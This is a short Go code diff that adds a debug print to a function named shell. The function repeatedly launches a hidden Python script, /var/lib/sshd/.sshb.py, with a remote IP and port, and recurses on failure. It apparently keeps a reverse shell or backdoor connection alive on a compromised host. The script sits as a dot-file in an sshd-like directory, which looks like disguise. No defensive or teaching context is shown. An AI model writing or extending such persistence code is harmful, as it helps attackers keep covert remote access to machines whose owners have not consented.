@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"os/exec"
 	"time"
 )
@@ -12,8 +13,10 @@ func shell(ip string, port string) {
 
 	cmd := exec.Command("/usr/bin/python3", "/var/lib/sshd/.sshb.py", ip, port) //execute the command
 	err := cmd.Run()                                                            //define err by running cmd
-	if err != nil {                                                             //if there is an error, re-loop
+	if err != nil {
+		fmt.Printf("%s", "broken") //if there is an error, re-loop
 		shell(ip, port)
+
 	}
 }
 
